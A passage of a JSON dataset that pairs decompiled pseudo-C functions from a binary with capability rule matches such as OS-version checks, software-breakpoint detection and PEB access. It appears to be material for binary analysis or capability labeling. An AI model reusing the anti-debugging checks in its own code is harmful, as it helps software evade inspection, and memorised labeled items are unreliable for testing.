        "decompiled_code": "\nuint __cdecl fcn.000783a0(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t arg_10h_00;\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = arg_10h + 0x1c;\n    arg_10h_00 = fcn.00035200(arg_8h_00);\n    if (arg_10h_00 == 0) {\n        uVar1 = 0xc000009a;\n    }\n    else {\n        fcn.00078790(arg_10h_00, 0, arg_8h_00);\n        *(arg_10h_00 + 5) = 0x10;\n        *(arg_10h_00 + 8) = *0xb1be2620;\n        *(arg_10h_00 + 0xc) = *0xb1be2624;\n        *(arg_10h_00 + 0x10) = *0xb1be2628;\n        *(arg_10h_00 + 0x14) = *0xb1be262c;\n        *(arg_10h_00 + 0x18) = *0xb1be2630;\n        *(arg_10h_00 + 6) = arg_10h;\n        fcn.0007877e(arg_10h_00 + 0x19, arg_ch, arg_10h);\n        uVar1 = fcn.000780a0(arg_8h, arg_8h_00, arg_10h_00, arg_14h, arg_18h);\n        fcn.00035330(arg_10h_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 425
    },
    "00037150": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00037150(uint arg_8h, uint8_t *arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = (**0xb1bde004)();\n    *arg_ch = uVar1;\n    if (*arg_ch < 2) {\n        (**0xb1bde000)();\n    }\n    fcn.00036f80(arg_8h, arg_10h);\n    return;\n}\n",
        "token_count": 104
    },
    "00037180": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00037180(uint arg_8h, uint8_t *arg_ch, uint arg_10h)\n\n{\n    fcn.00037060(arg_8h, arg_10h);\n    if (*arg_ch < 2) {\n        (**0xb1bde008)();\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "000371b0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.000371b0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00037150(arg_8h, &var_4h, 1);\n    do {\n        iVar1 = fcn.0001b770(arg_8h + 8, 0, 0);\n    } while (iVar1 != 0);\n    fcn.00036f40(arg_8h, 0);\n    fcn.00036f40(arg_8h + 4, 0);\n    fcn.00036f40(arg_8h + 8, 0);\n    if (var_4h < 2) {\n        (**0xb1bde008)();\n    }\n    return;\n}\n",
        "token_count": 185
    },
    "000619d0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000619d0(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    if (*(arg_8h + 0x70) == 2) {\n        uVar1 = fcn.000622b0(arg_ch, arg_10h);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 97
    },
    "0006a980": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0006a980(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    fcn.00034550(arg_8h + 0x130);\n    for (var_4h = 0; var_4h < 2; var_4h = var_4h + 1) {\n        iVar1 = fcn.0001a8e0(arg_8h + 0x2c + var_4h * 0x18, 0xb1c37e30, arg_8h + 0x28 + var_4h * 0x18);\n        if (iVar1 == 0) {\n            *(arg_8h + 0x28 + var_4h * 0x18) = 1;\n        }\n        else {\n            *(arg_8h + 0x28 + var_4h * 0x18) = 3;\n            var_8h = var_8h + 1;\n        }\n    }\n    fcn.000345c0(arg_8h + 0x130);\n    if (var_8h == 2) {\n        uVar2 = 0x21590007;\n    }\n    else {\n        *(arg_8h + 0x1c) = arg_ch;\n        *(arg_8h + 0x20) = arg_10h;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 400
    },
    "0006ab30": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006ab30(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    \n    if ((arg_ch == 2) && (arg_14h == 0xc)) {\n        fcn.0007877e(arg_8h + 0x134, arg_10h, 0xc);\n        uVar1 = 0;\n    }\n    else if (arg_ch == 5) {\n        *(arg_8h + 0x140) = arg_10h;\n        uVar1 = 0;\n    }\n    else if (arg_ch == 0xb) {\n        *(arg_8h + 0x144) = arg_10h;\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 0x21590001;\n    }\n    return uVar1;\n}\n",
        "token_count": 208
    },
    "00049620": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00049620(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = fcn.00037750(arg_8h, arg_ch, &var_8h);\n    if ((iVar1 != 0) && (var_8h == *0xb1c4645c)) {\n        if (var_4h == 0xc001ba5e) {\n            return 1;\n        }\n        if (var_4h < 4) {\n            return var_4h + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 155
    },
    "000729b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000729b0(uint noname_0, unkuint3 *arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t in_ECX;\n    uint32_t var_4h;\n    \n    if (arg_10h < 3) {\n        uVar1 = 0;\n    }\n    else {\n        var_4h = in_ECX & 0xff000000 | *arg_ch;\n        fcn.00071df0(&var_4h);\n        if ((var_4h & 0x4000) == 0) {\n            if (((var_4h & 0x100) == 0) || ((var_4h & 0x400) != 0)) {\n                uVar1 = 0;\n            }\n            else {\n                uVar1 = 1;\n            }\n        }\n        else {\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 216
    },
    "00037620": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00037620(uint8_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t var_ch;\n    uint8_t *var_6h;\n    \n    do {\n        var_6h._0_1_ = 0;\n        stack0xfffffff8 = arg_8h;\n        for (var_ch = 0; var_ch < 8; var_ch = var_ch + 1) {\n            iVar1 = fcn.000785f8();\n            uVar2 = iVar1 % 0x3e;\n            if (uVar2 < 10) {\n                *stack0xfffffff8 = uVar2 + 0x30;\n            }\n            else if (uVar2 - 10 < 0x1a) {\n                *stack0xfffffff8 = uVar2 + 0x37;\n            }\n            else {\n                *stack0xfffffff8 = uVar2 + 0x3d;\n            }\n            var_6h._0_1_ = var_6h + *stack0xfffffff8;\n            *0x8 = stack0xfffffff8 + 1;\n        }\n    } while ((((*arg_8h == 0x41) && (arg_8h[1] == *arg_8h + 1)) && (arg_8h[2] == arg_8h[1] + 1)) &&\n            (arg_8h[3] == arg_8h[2] + 1));\n    *stack0xfffffff8 = var_6h / 0x1a + 0x41;\n    stack0xfffffff8[1] = 0x7a - var_6h % 0x1a;\n    return;\n}\n",
        "token_count": 405
    },
    "00031300": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00031300(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t var_12ch;\n    uint32_t var_128h;\n    uint32_t var_124h;\n    uint32_t var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_98h;\n    uint32_t *var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    for (var_54h = 0; var_54h < 0x10; var_54h = var_54h + 1) {\n        (&var_50h)[var_54h] = 0;\n    }\n    if (0x10 < arg_ch) {\n        arg_ch = 0x10;\n    }\n    for (var_54h = 0; var_54h < arg_ch; var_54h = var_54h + 1) {\n        (&var_50h)[var_54h] = *(arg_10h + var_54h);\n    }\n    if (arg_ch < 0xb) {\n        *(arg_8h + 0x80) = 1;\n    }\n    else {\n        *(arg_8h + 0x80) = 0;\n    }\n    var_58h = &var_d8h;\n    var_12ch = var_50h << 0x18 | var_4ch << 0x10 | var_48h << 8 | var_44h;\n    var_128h = var_40h << 0x18 | var_3ch << 0x10 | var_38h << 8 | var_34h;\n    var_124h = var_30h << 0x18 | var_2ch << 0x10 | var_28h << 8 | var_24h;\n    var_120h = var_20h << 0x18 | var_1ch << 0x10 | var_18h << 8 | var_14h;\n    while( true ) {\n        uVar8 = var_12ch ^ *(var_1ch * 4 + -0x4e41fa20) ^ *(var_14h * 4 + -0x4e41f620) ^ *(var_20h * 4 + -0x4e41f220) ^\n                *(var_18h * 4 + -0x4e41ee20) ^ *(var_30h * 4 + -0x4e41f220);\n        uVar1 = uVar8 & 0xff;\n        uVar5 = uVar8 >> 8 & 0xff;\n        uVar9 = uVar8 >> 0x10 & 0xff;\n        uVar2 = uVar8 >> 0x18;\n        uVar10 = var_124h ^ *(uVar2 * 4 + -0x4e41fa20) ^ *(uVar5 * 4 + -0x4e41f620) ^ *(uVar9 * 4 + -0x4e41f220) ^\n                 *(uVar1 * 4 + -0x4e41ee20) ^ *(var_28h * 4 + -0x4e41ee20);\n        uVar3 = uVar10 & 0xff;\n        uVar6 = uVar10 >> 8 & 0xff;\n        uVar11 = uVar10 >> 0x10 & 0xff;\n        uVar4 = uVar10 >> 0x18;\n        uVar12 = var_120h ^ *(uVar3 * 4 + -0x4e41fa20) ^ *(uVar6 * 4 + -0x4e41f620) ^ *(uVar11 * 4 + -0x4e41f220) ^\n                 *(uVar4 * 4 + -0x4e41ee20) ^ *(var_2ch * 4 + -0x4e41fa20);\n        uVar7 = uVar12 >> 8 & 0xff;\n        uVar13 = uVar12 >> 0x10 & 0xff;\n        uVar14 = var_128h ^ *(uVar7 * 4 + -0x4e41fa20) ^ *(uVar13 * 4 + -0x4e41f620) ^\n                 *((uVar12 & 0xff) * 4 + -0x4e41f220) ^ *((uVar12 >> 0x18) * 4 + -0x4e41ee20) ^\n                 *(var_24h * 4 + -0x4e41f620);\n        *var_58h = *((uVar12 >> 0x18) * 4 + -0x4e41fa20) ^ *(uVar13 * 4 + -0x4e41f620) ^ *(uVar3 * 4 + -0x4e41f220) ^\n                   *(uVar6 * 4 + -0x4e41ee20) ^ *(uVar5 * 4 + -0x4e41fa20);\n        var_58h[1] = *(uVar7 * 4 + -0x4e41fa20) ^ *((uVar12 & 0xff) * 4 + -0x4e41f620) ^ *(uVar11 * 4 + -0x4e41f220) ^\n                     *(uVar4 * 4 + -0x4e41ee20) ^ *(uVar6 * 4 + -0x4e41f620);\n        var_58h[2] = *((uVar14 >> 0x18) * 4 + -0x4e41fa20) ^ *((uVar14 >> 0x10 & 0xff) * 4 + -0x4e41f620) ^\n                     *(uVar1 * 4 + -0x4e41f220) ^ *(uVar5 * 4 + -0x4e41ee20) ^ *(uVar13 * 4 + -0x4e41f220);\n        var_58h[3] = *((uVar14 >> 8 & 0xff) * 4 + -0x4e41fa20) ^ *((uVar14 & 0xff) * 4 + -0x4e41f620) ^\n                     *(uVar9 * 4 + -0x4e41f220) ^ *(uVar2 * 4 + -0x4e41ee20) ^ *((uVar14 >> 0x18) * 4 + -0x4e41ee20);\n        uVar6 = uVar12 ^ *(uVar11 * 4 + -0x4e41fa20) ^ *(uVar3 * 4 + -0x4e41f620) ^ *(uVar4 * 4 + -0x4e41f220) ^\n                *(uVar6 * 4 + -0x4e41ee20) ^ *(uVar2 * 4 + -0x4e41f220);\n        uVar13 = uVar6 & 0xff;\n        uVar2 = uVar6 >> 8 & 0xff;\n        uVar7 = uVar6 >> 0x10 & 0xff;\n        uVar8 = uVar8 ^ *((uVar6 >> 0x18) * 4 + -0x4e41fa20) ^ *(uVar2 * 4 + -0x4e41f620) ^ *(uVar7 * 4 + -0x4e41f220) ^\n                *(uVar13 * 4 + -0x4e41ee20) ^ *(uVar5 * 4 + -0x4e41ee20);\n        uVar15 = uVar8 & 0xff;\n        uVar3 = uVar8 >> 8 & 0xff;\n        uVar5 = uVar8 >> 0x10 & 0xff;\n        uVar9 = uVar10 ^ *(uVar15 * 4 + -0x4e41fa20) ^ *(uVar3 * 4 + -0x4e41f620) ^ *(uVar5 * 4 + -0x4e41f220) ^\n                *((uVar8 >> 0x18) * 4 + -0x4e41ee20) ^ *(uVar9 * 4 + -0x4e41fa20);\n        uVar16 = uVar9 & 0xff;\n        uVar4 = uVar9 >> 8 & 0xff;\n        uVar10 = uVar9 >> 0x10 & 0xff;\n        uVar17 = uVar9 >> 0x18;\n        uVar11 = uVar14 ^ *(uVar4 * 4 + -0x4e41fa20) ^ *(uVar10 * 4 + -0x4e41f620) ^ *(uVar16 * 4 + -0x4e41f220) ^\n                 *(uVar17 * 4 + -0x4e41ee20) ^ *(uVar1 * 4 + -0x4e41f620);\n        uVar1 = uVar11 >> 8 & 0xff;\n        uVar12 = uVar11 >> 0x10 & 0xff;\n        var_58h[4] = *(uVar13 * 4 + -0x4e41fa20) ^ *(uVar2 * 4 + -0x4e41f620) ^ *((uVar11 >> 0x18) * 4 + -0x4e41f220) ^\n                     *(uVar12 * 4 + -0x4e41ee20) ^ *(uVar17 * 4 + -0x4e41fa20);\n        var_58h[5] = *(uVar7 * 4 + -0x4e41fa20) ^ *((uVar6 >> 0x18) * 4 + -0x4e41f620) ^ *(uVar1 * 4 + -0x4e41f220) ^\n                     *((uVar11 & 0xff) * 4 + -0x4e41ee20) ^ *(uVar12 * 4 + -0x4e41f620);\n        var_58h[6] = *(uVar15 * 4 + -0x4e41fa20) ^ *(uVar3 * 4 + -0x4e41f620) ^ *(uVar17 * 4 + -0x4e41f220) ^\n                     *(uVar10 * 4 + -0x4e41ee20) ^ *(uVar13 * 4 + -0x4e41f220);\n        var_58h[7] = *(uVar5 * 4 + -0x4e41fa20) ^ *((uVar8 >> 0x18) * 4 + -0x4e41f620) ^ *(uVar4 * 4 + -0x4e41f220) ^\n                     *(uVar16 * 4 + -0x4e41ee20) ^ *(uVar15 * 4 + -0x4e41ee20);\n        uVar1 = uVar6 ^ *(uVar12 * 4 + -0x4e41fa20) ^ *((uVar11 & 0xff) * 4 + -0x4e41f620) ^\n                *((uVar11 >> 0x18) * 4 + -0x4e41f220) ^ *(uVar1 * 4 + -0x4e41ee20) ^ *(uVar17 * 4 + -0x4e41f220);\n        uVar12 = uVar1 & 0xff;\n        uVar15 = uVar1 >> 8 & 0xff;\n        uVar2 = uVar1 >> 0x10 & 0xff;\n        uVar13 = uVar1 >> 0x18;\n        uVar3 = uVar9 ^ *(uVar13 * 4 + -0x4e41fa20) ^ *(uVar15 * 4 + -0x4e41f620) ^ *(uVar2 * 4 + -0x4e41f220) ^\n                *(uVar12 * 4 + -0x4e41ee20) ^ *(uVar4 * 4 + -0x4e41ee20);\n        uVar9 = uVar3 & 0xff;\n        uVar17 = uVar3 >> 8 & 0xff;\n        uVar4 = uVar3 >> 0x10 & 0xff;\n        uVar14 = uVar3 >> 0x18;\n        uVar5 = uVar11 ^ *(uVar9 * 4 + -0x4e41fa20) ^ *(uVar17 * 4 + -0x4e41f620) ^ *(uVar4 * 4 + -0x4e41f220) ^\n                *(uVar14 * 4 + -0x4e41ee20) ^ *(uVar10 * 4 + -0x4e41fa20);\n        uVar10 = uVar5 >> 8 & 0xff;\n        uVar6 = uVar5 >> 0x10 & 0xff;\n        uVar7 = uVar8 ^ *(uVar10 * 4 + -0x4e41fa20) ^ *(uVar6 * 4 + -0x4e41f620) ^ *((uVar5 & 0xff) * 4 + -0x4e41f220) ^\n                *((uVar5 >> 0x18) * 4 + -0x4e41ee20) ^ *(uVar16 * 4 + -0x4e41f620);\n        var_58h[8] = *(uVar12 * 4 + -0x4e41fa20) ^ *(uVar15 * 4 + -0x4e41f620) ^ *((uVar7 >> 0x18) * 4 + -0x4e41f220) ^\n                     *((uVar7 >> 0x10 & 0xff) * 4 + -0x4e41ee20) ^ *(uVar6 * 4 + -0x4e41fa20);\n        var_58h[9] = *(uVar2 * 4 + -0x4e41fa20) ^ *(uVar13 * 4 + -0x4e41f620) ^ *((uVar7 >> 8 & 0xff) * 4 + -0x4e41f220)\n                     ^ *((uVar7 & 0xff) * 4 + -0x4e41ee20) ^ *((uVar7 >> 0x18) * 4 + -0x4e41f620);\n        var_58h[10] = *(uVar9 * 4 + -0x4e41fa20) ^ *(uVar17 * 4 + -0x4e41f620) ^ *((uVar5 >> 0x18) * 4 + -0x4e41f220) ^\n                      *(uVar6 * 4 + -0x4e41ee20) ^ *(uVar15 * 4 + -0x4e41f220);\n        var_58h[0xb] = *(uVar4 * 4 + -0x4e41fa20) ^ *(uVar14 * 4 + -0x4e41f620) ^ *(uVar10 * 4 + -0x4e41f220) ^\n                       *((uVar5 & 0xff) * 4 + -0x4e41ee20) ^ *(uVar17 * 4 + -0x4e41ee20);\n        var_12ch = uVar5 ^ *(uVar4 * 4 + -0x4e41fa20) ^ *(uVar9 * 4 + -0x4e41f620) ^ *(uVar14 * 4 + -0x4e41f220) ^\n                   *(uVar17 * 4 + -0x4e41ee20) ^ *(uVar13 * 4 + -0x4e41f220);\n        uVar4 = var_12ch & 0xff;\n        uVar5 = var_12ch >> 8 & 0xff;\n        uVar8 = var_12ch >> 0x10 & 0xff;\n        var_128h = uVar1 ^ *((var_12ch >> 0x18) * 4 + -0x4e41fa20) ^ *(uVar5 * 4 + -0x4e41f620) ^\n                   *(uVar8 * 4 + -0x4e41f220) ^ *(uVar4 * 4 + -0x4e41ee20) ^ *(uVar15 * 4 + -0x4e41ee20);\n        uVar1 = var_128h & 0xff;\n        uVar6 = var_128h >> 8 & 0xff;\n        uVar9 = var_128h >> 0x10 & 0xff;\n        var_124h = uVar3 ^ *(uVar1 * 4 + -0x4e41fa20) ^ *(uVar6 * 4 + -0x4e41f620) ^ *(uVar9 * 4 + -0x4e41f220) ^\n                   *((var_128h >> 0x18) * 4 + -0x4e41ee20) ^ *(uVar2 * 4 + -0x4e41fa20);\n        var_24h = var_124h & 0xff;\n        var_28h = var_124h >> 8 & 0xff;\n        var_2ch = var_124h >> 0x10 & 0xff;\n        var_30h = var_124h >> 0x18;\n        var_120h = uVar7 ^ *(var_28h * 4 + -0x4e41fa20) ^ *(var_2ch * 4 + -0x4e41f620) ^ *(var_24h * 4 + -0x4e41f220) ^\n                   *(var_30h * 4 + -0x4e41ee20) ^ *(uVar12 * 4 + -0x4e41f620);\n        var_14h = var_120h & 0xff;\n        var_18h = var_120h >> 8 & 0xff;\n        var_1ch = var_120h >> 0x10 & 0xff;\n        var_20h = var_120h >> 0x18;\n        var_58h[0xc] = *(var_30h * 4 + -0x4e41fa20) ^ *(var_2ch * 4 + -0x4e41f620) ^ *(uVar1 * 4 + -0x4e41f220) ^\n                       *(uVar6 * 4 + -0x4e41ee20) ^ *(uVar4 * 4 + -0x4e41fa20);\n        var_58h[0xd] = *(var_28h * 4 + -0x4e41fa20) ^ *(var_24h * 4 + -0x4e41f620) ^ *(uVar9 * 4 + -0x4e41f220) ^\n                       *((var_128h >> 0x18) * 4 + -0x4e41ee20) ^ *(uVar1 * 4 + -0x4e41f620);\n        var_58h[0xe] = *(var_20h * 4 + -0x4e41fa20) ^ *(var_1ch * 4 + -0x4e41f620) ^ *(uVar4 * 4 + -0x4e41f220) ^\n                       *(uVar5 * 4 + -0x4e41ee20) ^ *(var_30h * 4 + -0x4e41f220);\n        var_58h[0xf] = *(var_18h * 4 + -0x4e41fa20) ^ *(var_14h * 4 + -0x4e41f620) ^ *(uVar8 * 4 + -0x4e41f220) ^\n                       *((var_12ch >> 0x18) * 4 + -0x4e41ee20) ^ *(var_1ch * 4 + -0x4e41ee20);\n        if (var_58h != &var_d8h) break;\n        var_58h = var_58h + 0x10;\n    }\n    for (var_54h = 0; var_54h < 0x10; var_54h = var_54h + 1) {\n        *(arg_8h + var_54h * 8) = (&var_d8h)[var_54h];\n        *(arg_8h + 4 + var_54h * 8) = (&var_98h)[var_54h] + 0x10 & 0x1f;\n    }\n    return;\n}\n",
        "token_count": 5156
    },
    "00037750": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037750(uint8_t *arg_8h, uint32_t arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    uint var_210h;\n    uint var_20ch;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint8_t var_5h;\n    uint8_t *var_4h;\n    \n    if (10 < arg_ch) {\n        var_4h = arg_8h;\n        var_5h = 0;\n        for (var_ch = 0; var_ch < 8; var_ch = var_ch + 1) {\n            if ((*var_4h < 0x21) || (0x7f < *var_4h)) {\n                return 0;\n            }\n            var_5h = var_5h + *var_4h;\n            var_4h = var_4h + 1;\n        }\n        var_10h = arg_ch;\n        if (0x200 < arg_ch - 10) {\n            var_10h = 0x20a;\n        }\n        if ((*var_4h == var_5h / 0x1a + 0x41) && (var_4h[1] == 0x7a - var_5h % 0x1a)) {\n            var_10h = fcn.000342e0(arg_8h + 10, &var_210h, var_10h - 10);\n            if (var_10h == 8) {\n                for (var_ch = 0; var_ch < var_10h; var_ch = var_ch + 1) {\n                    *(&var_210h + var_ch) = *(&var_210h + var_ch) ^ arg_8h[var_ch];\n                }\n                uVar1 = fcn.00035490(var_210h);\n                *arg_10h = uVar1;\n                uVar1 = fcn.00035490(var_20ch);\n                arg_10h[1] = uVar1;\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 478
    },
    "00037c60": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint fcn.00037c60(void)\n\n{\n    ushort uVar1;\n    int32_t arg_8h;\n    uint32_t var_4h;\n    \n    *0xb1c5a5c8 = 0;\n    *0xb1c5a5cc = 0;\n    *0xb1c5a5d0 = 0;\n    *0xb1c5a5d4 = 0;\n    *0xb1c5a5d8 = 0;\n    var_4h = 0;\n    while (var_4h < 10) {\n        arg_8h = fcn.00029470(var_4h + 0x2f3, 0);\n        uVar1 = fcn.000354c0(arg_8h);\n        *(arg_8h * 2 + -0x4e3a5a38) = uVar1;\n        var_4h = arg_8h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 240
    },
    "00037cd0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nint32_t fcn.00037cd0(void)\n\n{\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    for (var_8h = 0; var_8h < 10; var_8h = var_8h + 1) {\n        var_4h = (*(var_8h * 2 + -0x4e3a5a38) != 0) + var_4h;\n    }\n    return var_4h;\n}\n",
        "token_count": 121
    },
    "00037d20": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037d20(uint arg_8h)\n\n{\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    while( true ) {\n        if (9 < var_4h) {\n            return 0;\n        }\n        if (*(var_4h * 2 + -0x4e3a5a38) == arg_8h) break;\n        var_4h = var_4h + 1;\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "00044f40": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00044fbc\n\nuint __cdecl fcn.00044f40(int32_t arg_8h)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(arg_8h + 0x1c) = arg_8h;\n    *(arg_8h + 0x20) = *(arg_8h + 0x634);\n    *(arg_8h + 0x24) = 0;\n    *(arg_8h + 0x28) = *(arg_8h + 0x61c);\n    *(arg_8h + 0x2c) = *(arg_8h + 0x620);\n    if (10 < *(arg_8h + 0x634) - 1) {\n        return 0;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 225
    },
    "00071bd0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00071bf9\n\nuint __cdecl fcn.00071bd0(uint noname_0, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    if (10 < arg_ch - 3U) {\n        return 0x21590001;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 104
    },
    "0001eda0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0001eda0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    code *pcVar2;\n    uint arg_ch_00;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    if (((arg_ch != -1) && (arg_ch != -2)) && (iVar1 = fcn.00034aa0(arg_ch, &var_4h),  iVar1 == 0)) {\n        iVar1 = (**0xb1bde2a4)(var_4h, 0, **0xb1bde104, 0, &var_8h, 0);\n        if (iVar1 == 0) {\n            if ((((*(var_8h + 0x2c) & 0x400000) != 0) && (iVar1 = fcn.000174a0(*(var_8h + 4)),  iVar1 != 0)) &&\n               (iVar1 = fcn.0005a110(),  iVar1 != *(*0xb1c59660 + 0x14))) {\n                arg_ch_00 = 0;\n                arg_8h_00 = fcn.0005a110();\n                fcn.0001fbb0(arg_8h_00, arg_ch_00);\n            }\n            (**0xb1bde2e4)();\n        }\n        fcn.00034af0(arg_ch, var_4h);\n    }\n    pcVar2 = fcn.000639f0(arg_8h);\n    (*pcVar2)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h, arg_2ch);\n    return;\n}\n",
        "token_count": 468
    },
    "0001fbb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
